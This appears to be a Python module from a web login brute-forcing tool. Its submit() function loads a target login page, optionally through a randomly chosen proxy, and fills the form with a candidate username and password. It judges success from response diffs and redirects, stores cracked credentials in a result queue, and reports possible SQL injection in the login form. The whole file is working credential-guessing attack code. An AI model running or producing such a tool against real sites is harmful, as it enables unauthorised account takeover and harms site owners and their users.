from utils import events
from cores.actions import randomFromList
from cores.check import parseLoginForm
from cores.analysis import check_login, check_sqlerror, getredirect


def submit(options, loginInfo, tryCred, result):
	tryPassword, tryUsername = tryCred
	
	# proc = Browser(options.timeout) # TODO recovery here
	
	# BREAK if we had valid payload?
	# if options.options["-p"] == "sqli" and len(list(result.queue)) > 1:
	# 	return True
	
	if tryUsername in [x[1] for x in list(result.queue)]:
		return True
	
	from cores.browser import Browser
	try:
		proc = Browser()
		if options.proxy:
			# Set proxy connect
			proxyAddr = randomFromList(options.proxy)
			proc.setproxy(proxyAddr)
		else:
			proxyAddr = ""
		
		proc.open_url(options.login_url)
		_form = parseLoginForm(proc.forms())
		
		if not _form:
			if options.verbose:
				events.error("Get blocked", "BRUTE")
			return False
		else:
			frmCtrl, frmFields = _form

		if options.verbose and loginInfo != _form:
			events.info("Login form has been changed", "BRUTE")

		resp = proc.xsubmit(frmCtrl, frmFields, tryCred)

		from cores.analysis import getdiff
		txtDiff, srcDiff = getdiff(options.txt.decode('utf-8'), resp.content.decode('utf-8'))
		
		# print(getredirect(srcDiff))
		
		if not parseLoginForm(proc.forms()):
			isLoginForm = False
			for diffURL in getredirect(srcDiff):
				if not diffURL.startswith("http"):
					try:
						from urllib.parse import urljoin
					except ImportError:
						from urlparse import urljoin
					diffURL = urljoin(options.login_url, diffURL)
					proc.open_url(diffURL)
					if parseLoginForm(proc.forms()):
						isLoginForm = True
					break

			test_result = check_login(options, proc)
			if test_result == 1:
				# "If we tried login form with username+password field"
				if tryUsername:
					if resp.status_code >= 400:
						events.error("['%s':'%s'] <--> %s" % (tryUsername, tryPassword, proxyAddr), "%s" % (resp.status_code))
					elif not isLoginForm:
						events.found(tryUsername, tryPassword, proc.get_title())
						result.put([options.url, tryUsername, tryPassword])
				# "Else If we tried login form with password field only"
				else:
					if resp.status_code >= 400:
						events.error("[%s] <--> %s" % (tryPassword, proxyAddr), "%s" % (resp.status_code))
					elif not isLoginForm:
						events.found('', tryPassword, proc.get_title())
						result.put([options.url, tryUsername, tryPassword])

			elif test_result == 2 and options.verbose:
				events.success("SQL Injection in login form", "BRUTE")
				events.info("['%s': '%s']" % (tryUsername, tryPassword))
	
			else:
				# Possibly Error. But sometime it is true
				if options.verbose:
					events.error("['%s': '%s'] [%s]" % (tryUsername, tryPassword, proc.get_title()), "BRUTE")

		# "Login form is still there. Oops"
		else:
			if check_sqlerror(proc.get_resp()) and options.verbose:
				events.success("SQL Injection in login form", "BRUTE")
				events.info("['%s': '%s']" % (tryUsername, tryPassword))
			if options.verbose:
				if tryUsername:
					events.fail("['%s':%s'] <==> %s" % (tryUsername, tryPassword, proxyAddr), txtDiff, proc.get_title())
				else:
					events.fail("['%s'] <==> %s" % (tryPassword, proxyAddr), txtDiff, proc.get_title())
		
		return True
	
	except Exception as error:
		"""
			Sometimes, web servers return error code because of bad configurations,
			but our cred is true.
			This code block showing information, for special cases
		"""
		events.error("%s" % (error), "BRUTE")
	
	finally:
		proc.close()